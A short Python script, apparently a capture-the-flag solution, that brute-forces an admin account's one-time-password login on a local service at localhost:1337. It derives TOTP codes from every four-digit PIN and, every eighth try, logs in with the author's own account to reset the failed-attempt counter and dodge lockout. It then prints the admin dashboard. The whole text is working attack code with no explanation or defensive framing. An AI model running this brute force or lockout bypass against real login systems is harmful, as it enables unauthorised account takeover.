import pyotp
import base64
import requests

S = requests.Session()

my_pin = "9359"

for i in range(9999):

    otp = pyotp.TOTP(base64.b32encode(str(i).zfill(10).encode())).now()
    my_otp = pyotp.TOTP(base64.b32encode(my_pin.zfill(10).encode())).now()

    #Send a login request for admin
    R = S.post("http://localhost:1337/api/login",json={"username":"admin","code":otp})

    if R.status_code == 200:
        print("\nFound it! %d - Code right now: %s" % (i,otp))
        R = S.get("http://localhost:1337/dashboard")
        print(R.text)
        exit()

    print("\r%s" % R.json()["message"],end="")

    #Send my login every few so that it resets and we don't get locked out
    if i % 8 == 0:
        R = S.post("http://localhost:1337/api/login", json={"username": "tsuto", "code": my_otp})
